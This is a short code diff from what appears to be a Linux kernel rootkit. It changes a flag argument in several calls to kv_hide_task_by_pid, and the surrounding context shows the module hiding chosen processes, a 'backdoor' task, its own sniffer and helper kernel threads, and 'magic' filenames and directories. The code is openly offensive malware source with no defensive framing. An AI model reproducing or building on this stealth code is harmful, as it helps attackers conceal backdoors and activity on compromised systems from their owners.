@@ -565,11 +565,11 @@ static int _run_send_sig(int sig, pid_t pid, bool restart)
 	if (!kv_find_hidden_pid(&status, pid))
 		return rc;
 
-	rc = kv_hide_task_by_pid(pid, 0, CHILDREN);
+	rc = kv_hide_task_by_pid(pid, 0, true);
 	if (!rc) {
 		rc = kv_send_signal(sig, status.task);
 		if (restart) {
-			rc = kv_hide_task_by_pid(pid, 0, CHILDREN);
+			rc = kv_hide_task_by_pid(pid, 0, true);
 		}
 	}
 	return rc;
@@ -621,7 +621,7 @@ static ssize_t write_cb(struct file *fptr, const char __user *user, size_t size,
 
 	pid = (pid_t)simple_strtol((const char *)param, NULL, 10);
 	if (pid > 1) {
-		rc = kv_hide_task_by_pid(pid, 0, CHILDREN);
+		rc = kv_hide_task_by_pid(pid, 0, true);
 		_set_msguser_retcode(&rc, MSG_INT);
 	} else {
 		substring_t args[MAX_OPT_ARGS];
@@ -633,7 +633,7 @@ static ssize_t write_cb(struct file *fptr, const char __user *user, size_t size,
 			break;
 		case Opt_hide_task_backdoor:
 			if (sscanf(args[0].from, "%d", &pid) == 1)
-				rc = kv_hide_task_by_pid(pid, 1, CHILDREN);
+				rc = kv_hide_task_by_pid(pid, 1, true);
 			_set_msguser_retcode(&rc, MSG_INT);
 			break;
 		case Opt_list_hidden_tasks:
@@ -987,8 +987,8 @@ static int __init kv_init(void)
 	}
 
 	// hide kthreads
-	kv_hide_task_by_pid(tsk_sniff->pid, 0, CHILDREN);
-	kv_hide_task_by_pid(tsk_prc->pid, 0, CHILDREN);
+	kv_hide_task_by_pid(tsk_sniff->pid, 0, true);
+	kv_hide_task_by_pid(tsk_prc->pid, 0, true);
 
 	// hide magic filenames, directories and processes
 	for (name = hide_names; *name != NULL; ++name) {
